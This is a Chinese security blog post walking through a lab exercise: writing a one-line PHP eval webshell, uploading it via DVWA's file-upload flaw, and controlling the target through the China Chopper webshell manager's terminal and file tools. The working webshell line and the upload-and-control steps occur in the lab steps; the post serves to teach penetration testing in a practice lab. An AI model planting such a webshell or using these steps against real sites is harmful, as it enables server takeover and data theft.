---
title: 会用这个！网站后台轻松拿下！！
url: https://mp.weixin.qq.com/s/6TNQ7cao9a7YghTA_OHzUg
source: Doonsec's feed
date: 2026-04-25
fetch_date: 2026-04-26T05:00:22.598234
---

# 会用这个！网站后台轻松拿下！！

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/QJTLZsy5trEwqg9F446tOsTE6faMSnWxX6913U2Vhn0t0xsqoRQc58QvibkdSX0BT6F8qWjYUJDmCticg8ibyibk2xlQEhR6g3BGJu8XrZqolns/0?wx_fmt=jpeg)

# 会用这个！网站后台轻松拿下！！

原创

建哥聊安全
建哥聊安全

建哥聊安全

![]()

在小说阅读器读本章

去阅读

![]()

在小说阅读器中沉浸阅读

# **免责声明：**严格禁止**对任何未授权系统/网络进行扫描、攻击或入侵。 禁止制作/传播恶意程序，禁止参与任何网络犯罪。如擅自将本文实验技术用于非法用途，一切法律后果及责任由行为人独立承担，与作者无关。**

# **“中国菜刀”**

## **实验目的**

熟悉PHP一句话木马的编写及Webshell管理工具“中国菜刀”的配置使用。

## **实验环境**

#### **操作机：Pentest-Atk**

（1）操作系统：Windows 10

（2）安装的应用软件：AWVS、Havij、菜刀、蚁剑等

（3）登录账号密码：操作系统账号Administrator，密码Sangfor!7890

#### **靶机：A-SQLi-Labs**

（1）操作系统：CentOS 7

（2）安装的应用软件：Apache、MySQL(MariaDB)、PHP；DVWA、SQLi-Labs、Webug3.0漏洞网站环境

（3）登录账号密码：操作系统账号root，密码Sangfor!7890

## **实验原理**

（1）关于Webshell

Webshell是以ASP、PHP、JSP或者CGI等网页文件形式存在的一种代码执行环境，主要用于网站管理、服务器管理、权限管理等操作。
Webshell使用方法简单，只需上传一个代码文件，通过网址访问，便可进行很多日常操作，极大地方便了使用者对网站和服务器的管理。正因如此，也有小部分人将代码修改后当作后门程序使用，以达到控制网站服务器的目的。

（2）关于中国菜刀

中国菜刀是一款专业的Webshell管理软件，用途广泛，使用方便，小巧实用，只要支持动态脚本的网站，都可以用中国菜刀来进行管理。

## **实验步骤**

#### **1．编写PHP一句话木马（Webshell）**

在操作机Pentest-Atk桌面新建一个文本文档并更名为muma.php：

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFweWFCXiaiaD0A7IcdVpqvhnOsGqMNsIyUbnxcnVeoZPeG3OIlRicp3yQvgof2oHYG1wIWIKWMdc7YrfBibU2SWsMWfQlAUooL4tc/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trGibxWZ8dOsaqrUiab8r8BXnYonvaZmiaFLlwLV5ghl48T9FDfKKy21vgmG4cX9Q3289plUkkMgAY2iaSlIbibLS6FM8ar8z7rmg9uY/640?wx_fmt=png&from=appmsg)

鼠标右键单击muma.php，在弹出的菜单中选择“Edit with Notepad++”:

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trGHARkPV0yF0wc9jVLJzjlVUDXJLKKX71lcqoIWZGh9ibJtJ53iaryXbKyrC6uQGibNiaWkNZSunkX2sTBujguDbdlZibvArPUFbzlY/640?wx_fmt=png&from=appmsg)

用Notepad++打开此文件后，在文件中输入以下代码并保存：

<?php @eval($\_POST['123456']); ?>

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trHGE1uDfIs2M6J2uJicVLRjKiaOt7ibXypg3cIuwLpm9ECicVI5CaLSKYsdNGOicPoiaia9skuHIdbJrJiaOtX4ILP5vcJPuSC6BpCyk9g/640?wx_fmt=png&from=appmsg)

#### **2．利用靶机的文件上传漏洞，将此木马文件（Webshell）上传至靶机**

（1）在操作机Pentest-Atk上启动浏览器，在地址栏中输入以下URL访问靶机上的DVWA网站：

http://[靶机IP]/dvwa/

（注意大小写）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trGoT94zP9MLlPej5EFSFL8ZHquxQ3tKqZL5pgmfUNoK1pwPicPN5LdiahGOAHvn5AfYsDE9rA9xOicVfw5TbKdRmT6IiakGvkdRiaWY/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trGUBVhzu2aTBtZnS5s23sAhUYks89gM5tX6O2XicsbVxBSibQKshgFMiboK8iaqCVO78gjewwC3WZaBFuZnMAaLRPpNBI2ZibCOTgwA/640?wx_fmt=png&from=appmsg)

（2）成功登录DVWA网站后，在网站主页左侧菜单选择DVWA Security，将网站的安全级别设置为“Low”：

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trGDwfwVynxibd2Nvl0trOMicTLBOMiaThsPL6ibxNKibJBY32CUeqr0d93KzydsxNL8E6wLwBQMZeFxFYeD63b3uI5enHhXdT3SB9AM/640?wx_fmt=png&from=appmsg)

（3）在DVWA网站主页左侧菜单选择“File upload”进入文件上传训练关卡，将muma.php上传至靶机，并记下文件上传的路径：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trH7b4j5sc34LVQm1sXib8ud2IvC3gePojQM0c0ic0icVn0X291VHkEKibxWQNK84dYLQUzSL9toRpiaBxGx2bXqTvnGlvF1kM3NqpTQ/640?wx_fmt=png&from=appmsg)

#### **3．利用“中国菜刀”连接靶机上的muma.php**

（1）在操作机Pentest-Atk上进入桌面文件夹tools/中国菜刀(过狗)，鼠标左键双击“中国菜刀(过狗).exe”程序，运行“中国菜刀”：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trEzWL3y6IpcqOMib2ZJRC8L6bVmMSlDljlR46sbCkMcxn8XujrLia1LS2tXyryLFKIPsgODYcMWv8ULuQfUlpSKYclrjSuyq1zFE/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trGwDrcqAtZepJN4x5QGTLlntraRHVEljibeXDmNbJrPR1OQNysmUuibwN6QiadU6tic956nmEElJvOsMb85ohh0W9QyqrDQXGmHsjs/640?wx_fmt=png&from=appmsg)

（2）在“中国菜刀”主界面空白处单击鼠标右键，在弹出的菜单中选择“添加”，

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trH87LgWCkrn856Yc9BBj914qhUjbto7KLLmiaV4erVRibj2yBPPXibMIO0yDHzIroEGLrPp7WCj5PqIZrl6CWOopzPGMOXoRJMiaibA/640?wx_fmt=png&from=appmsg)

添加一条Webshell管理项：

地址：http://[靶机IP]/dvwa/hackable/uploads/muma.php

连接密码：123456

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trHWiacs52hVhk3GQHtyBaiaiaH5JgfwwPkX9PfNtS5GN9K1q8vsTLxHEINq5HkiafPwQ6Ve8DibjhuayukIibQMs11brU4ticOVzOPfpQ/640?wx_fmt=png&from=appmsg)

添加完成后，会看到主界面多了一条Webshell管理项：

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trHjaS5jh7s4ymiavAyJ0WUcOKN3GucpluGt24Ipvib0QwG8d4zeRIDhicNpAJQ8rzFQaIfMFub2ic4BnU0lU7uEr6o6vOHdDtndGa0/640?wx_fmt=png&from=appmsg)

#### **4．利用“中国菜刀”对靶机进行虚拟终端及文件操作**

（1）虚拟终端操作

选中muma.php所在的Webshell管理项，单击鼠标右键，在弹出的菜单中选择“虚拟终端”

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trEjA7qtYek4fnbXCwibU1Gg3CnK6TVo6LW9fQdIqXjV2ct5xe6eoRKkE071TzhNYFiawsPn0tgyv63kwR57ia4nvCSbqiaVyuC9sIg/640?wx_fmt=png&from=appmsg)

打开虚拟终端界面后，可以像操作本地机器一样，对靶机执行一些操作系统命令（如whoami、id、netstat -an等）：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trGdeibKcNlBEomQ5u2323g2DEolGqeWsZbVnJJ5GHCR2HpgJdGoPCQ1plRwo42GhxuiaaiaROwaRxJrCAPtYWcicdMlpL5w0Cibu0xg/640?wx_fmt=png&from=appmsg)

（2）文件操作

选中muma.php所在的Webshell管理项，单击鼠标右键，在弹出的菜单中选择“文件管理”：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/QJTLZsy5trHWwWJgXLsNzpnVcTlUgK68Lliaz9g3TuFrYB3mhqqpgicDtBsJfRrncS48je8OTQepiabYCwanlkHvShzibOxOZqeNLUK1RjbQgEE/640?wx_fmt=png&from=appmsg)

打开文件管理界面后，可以像操作本地机器一样，对靶机系统进行一些操作（如上传文件、下载文件、修改文件属性等）：

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trFIKjrQvIYcxwq9gk79Oiatue6eylI0HiaYl4whGwia7Gv8f8KtaNQVEuzXMdicoO0N7rwp8AGntfQzFzTZjC5rCBMicmHogP3EpktI/640?wx_fmt=png&from=appmsg)

![](https://mmbiz.qpic.cn/mmbiz_png/QJTLZsy5trEjiarpibEwQicgWV97qsOfRkiaJUazec9nicxP6Awia3cs3YzTaAgt44CMcRT2ziagT8ic5VNXBNnjD9gOulbmWplt9z0wRJoibS9PCcmg/640?wx_fmt=png&from=appmsg)

实验至此结束。

## **实验总结**

本次实验，熟悉了PHP一句话木马的编写及“中国菜刀”的配置使用。

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/sz_mmbiz_png/Yxh0GAibwTaORa9r0ajicyoicMtnziaKFLwhxuibUhsBa2Wup0Frtic9OI56H3Psr3tYtxVTDQcPAUk8Oze23XAeFQoQ/0?wx_fmt=png)

建哥聊安全

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/sz_mmbiz_png/Yxh0GAibwTaORa9r0ajicyoicMtnziaKFLwhxuibUhsBa2Wup0Frtic9OI56H3Psr3tYtxVTDQcPAUk8Oze23XAeFQoQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过